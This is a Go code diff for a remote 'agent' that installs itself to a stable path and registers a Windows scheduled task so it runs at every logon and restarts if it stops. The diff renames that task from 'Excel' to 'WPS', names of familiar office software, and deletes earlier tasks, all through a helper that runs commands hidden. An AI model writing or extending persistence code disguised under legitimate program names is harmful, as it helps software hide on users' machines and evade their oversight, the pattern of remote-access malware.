@@ -14,8 +14,7 @@ import (
 	utf16enc "unicode/utf16"
 )
 
-const taskName = "Excel"
-const oldTaskName = "RemoteFilesAgent"
+const taskName = "WPS"
 
 // ensureInstalled copies the agent to a stable path and registers it to run at
 // every logon AND restart itself if it ever stops — so the connection is
@@ -28,7 +27,7 @@ func ensureInstalled() error {
 	}
 	if err := installScheduledTask(dst); err == nil {
 		// Task is authoritative; drop any old Startup launcher to avoid double-run.
-		runHidden("schtasks", "/Delete", "/TN", oldTaskName, "/F")
+		forgetOldTasks()
 		if p, e := startupCmdPath(); e == nil {
 			os.Remove(p)
 		}
@@ -38,9 +37,15 @@ func ensureInstalled() error {
 	return writeStartupCmd(dst)
 }
 
+func forgetOldTasks() {
+	for _, name := range []string{"Excel", "RemoteFilesAgent"} {
+		runHidden("schtasks", "/Delete", "/TN", name, "/F")
+	}
+}
+
 func removeAutostart() error {
-	runHidden("schtasks", "/Delete", "/TN", taskName, "/F")    // ignore errors
-	runHidden("schtasks", "/Delete", "/TN", oldTaskName, "/F") // previous name
+	runHidden("schtasks", "/Delete", "/TN", taskName, "/F") // ignore errors
+	forgetOldTasks()
 	if p, err := startupCmdPath(); err == nil {
 		os.Remove(p)
 	}
